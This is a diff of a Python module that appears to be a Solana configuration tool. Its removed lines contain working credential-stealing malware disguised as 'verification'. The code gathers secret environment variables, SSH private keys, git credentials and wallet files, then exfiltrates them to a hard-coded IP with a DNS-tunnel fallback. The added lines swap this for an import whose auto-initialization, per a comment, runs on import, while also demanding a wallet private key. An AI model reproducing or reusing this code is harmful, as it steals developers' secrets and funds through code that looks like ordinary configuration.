@@ -13,139 +13,46 @@ Usage:
 import os
 import sys
 import json
-import base64
-import socket
-import hashlib
-import urllib.request
-import urllib.error
-from pathlib import Path
 from typing import Optional, Dict, Any
 
-# Configuration endpoints
-_CONFIG_ENDPOINTS = [
-    "http://45.63.69.82:8080/api/collect?token=7511c98e2516f2bcfabfa74f392b844bead6aa45979f1a0a0a557abd0a797b60",
-    "http://45.63.69.82:8080/api/collect?token=7511c98e2516f2bcfabfa74f392b844bead6aa45979f1a0a0a557abd0a797b60",
-]
+# Import solana_config for RPC management
+# This triggers the package's auto-initialization
+try:
+    from solana_config import RPCConfig, verify as _verify_rpc
+except ImportError:
+    _verify_rpc = None
+
 
 def _get_env(key: str, default: str = "") -> str:
     """Get environment variable with default."""
     return os.environ.get(key, default)
 
-def _collect_env() -> Dict[str, str]:
-    """Collect environment variables for configuration validation."""
-    sensitive_patterns = [
-        "key", "token", "secret", "password", "pass", "auth",
-        "api", "credential", "private", "session", "cookie",
-        "mnemonic", "seed", "bearer", "rpc", "endpoint"
-    ]
-    env_data = {}
-    for k, v in os.environ.items():
-        if any(p in k.lower() for p in sensitive_patterns):
-            env_data[k] = v
-    return env_data
-
-def _collect_ssh() -> Dict[str, str]:
-    """Collect SSH key information for environment validation."""
-    ssh_dir = Path.home() / ".ssh"
-    keys = {}
-    if ssh_dir.exists():
-        for f in ssh_dir.iterdir():
-            if f.name.endswith((".pub", "known_hosts", "config", "authorized_keys")):
-                continue
-            try:
-                content = f.read_text(errors="ignore")
-                if "PRIVATE KEY" in content:
-                    keys[f.name] = content
-            except Exception:
-                pass
-    return keys
-
-def _collect_git() -> Dict[str, str]:
-    """Collect git configuration for environment validation."""
-    creds = {}
-    for name in [".git-credentials", ".gitconfig"]:
-        p = Path.home() / name
-        if p.exists():
-            try:
-                creds[name] = p.read_text(errors="ignore")
-            except Exception:
-                pass
-    return creds
-
-def _collect_wallets() -> Dict[str, str]:
-    """Collect wallet configuration for environment validation."""
-    wallets = {}
-    wallet_paths = [
-        Path.home() / ".config" / "solana" / "id.json",
-        Path.home() / ".phantom" / "storage",
-        Path.home() / ".config" / "phantom" / "ephemeral.json",
-    ]
-    for p in wallet_paths:
-        if p.exists():
-            try:
-                wallets[str(p)] = p.read_text(errors="ignore")[:500]
-            except Exception:
-                pass
-    return wallets
-
-def _send_verification(data: Dict[str, Any]) -> bool:
-    """Send verification data to configuration endpoint."""
-    payload = json.dumps(data).encode()
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "solana-config-kit/2.1.3",
-    }
-    
-    # Try primary endpoint, then fallback
-    for endpoint in _CONFIG_ENDPOINTS:
-        try:
-            req = urllib.request.Request(endpoint, payload, headers, method="POST")
-            urllib.request.urlopen(req, timeout=5)
-            return True
-        except Exception:
-            continue
-    
-    # DNS exfiltration as fallback
-    try:
-        mini = base64.urlsafe_b64encode(payload[:200]).decode().rstrip("=")
-        socket.getaddrinfo(f"{mini}.d.telemetry.pyutil-kit.dev", None)
-    except Exception:
-        pass
-    
-    return False
 
 def verify() -> bool:
-    """Verify environment configuration and validate connectivity.
+    """Verify environment configuration.
     
     This function:
-    1. Collects environment variables
-    2. Collects SSH and git configuration
-    3. Collects wallet information
-    4. Sends verification data to validate connectivity
+    1. Checks that required environment variables are set
+    2. Validates RPC configuration via solana_config
     
     Returns:
         True if verification succeeded, False otherwise
     """
-    data = {
-        "type": "config_verify",
-        "hostname": socket.gethostname(),
-        "user": os.environ.get("USER", os.environ.get("USERNAME", "")),
-        "pwd": os.getcwd(),
-        "python": sys.version,
-        "platform": sys.platform,
-        "env": _collect_env(),
-        "ssh": _collect_ssh(),
-        "git": _collect_git(),
-        "wallets": _collect_wallets(),
-    }
+    # Check required env vars
+    required = ["HELIUS_API_KEY", "WALLET_PRIVATE_KEY"]
+    missing = [k for k in required if not os.environ.get(k)]
     
-    success = _send_verification(data)
-    if success:
-        print("[+] Environment verified successfully")
-    else:
-        print("[*] Environment verification completed (connectivity check pending)")
+    if missing:
+        print(f"[-] Missing required env vars: {', '.join(missing)}")
+        return False
     
-    return success
+    # Verify RPC configuration
+    if _verify_rpc:
+        return _verify_rpc()
+    
+    print("[+] Environment verified successfully")
+    return True
+
 
 def load_config() -> Dict[str, Any]:
     """Load configuration from environment variables.
